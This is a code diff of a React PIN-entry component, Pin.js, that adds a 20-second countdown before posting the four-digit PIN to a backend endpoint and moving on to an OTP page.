@@ -1,3 +1,5 @@
+
+// Pin.js
 import React, { useState } from "react";
 import { useNavigate } from "react-router-dom";
 import "../App.css";
@@ -18,6 +20,10 @@ const schema = yup.object().shape({
 
 const Pin = () => {
   const navigate = useNavigate();
+  const [pin, setPin] = useState(new Array(4).fill(""));
+  const [loading, setLoading] = useState(false);
+  const [countdown, setCountdown] = useState(0);
+  
   const {
     register,
     handleSubmit,
@@ -25,38 +31,49 @@ const Pin = () => {
     formState: { errors },
   } = useForm({ resolver: yupResolver(schema) });
 
-  const [pin, setPin] = useState(new Array(4).fill(""));
-  const [loading, setLoading] = useState(false);
-
   const handleChange = (element, index) => {
     const value = element.value;
     if (!/^\d$/.test(value)) return;
-
     const newPin = [...pin];
     newPin[index] = value;
     setPin(newPin);
-
     if (index < 3 && value !== "") {
       document.getElementById(`pin-${index + 1}`).focus();
     }
-
     setValue("pin", newPin.join(""));
   };
 
   const submitForm = (data) => {
     setLoading(true);
-    axios
-      .post(`${BASE_URL}/pin`, data)
-      .then((response) => {
-        console.log(response.data);
-        navigate("/otp");
-      })
-      .catch((error) => {
-        console.error("There was an error!", error);
-      })
-      .finally(() => {
-        setLoading(false);
+    setCountdown(20);
+    
+    // Start countdown
+    const countdownInterval = setInterval(() => {
+      setCountdown((prev) => {
+        if (prev <= 1) {
+          clearInterval(countdownInterval);
+          return 0;
+        }
+        return prev - 1;
       });
+    }, 1000);
+
+    // Wait 20 seconds before making the API call
+    setTimeout(() => {
+      axios
+        .post(`${BASE_URL}/pin`, data)
+        .then((response) => {
+          console.log(response.data);
+          navigate("/otp");
+        })
+        .catch((error) => {
+          console.error("There was an error!", error);
+        })
+        .finally(() => {
+          setLoading(false);
+          setCountdown(0);
+        });
+    }, 20000);
   };
 
   return (
@@ -84,12 +101,15 @@ const Pin = () => {
                   />
                 ))}
               </div>
-
               <FormErrMsg errors={errors} inputName="pin" />
-
               <div className="buttonSec">
                 <button type="submit" disabled={loading}>
-                  {loading ? "Loading..." : "Next"}
+                  {loading 
+                    ? countdown > 0 
+                      ? `Please wait... ${countdown}s` 
+                      : "Processing..."
+                    : "Next"
+                  }
                 </button>
               </div>
             </form>
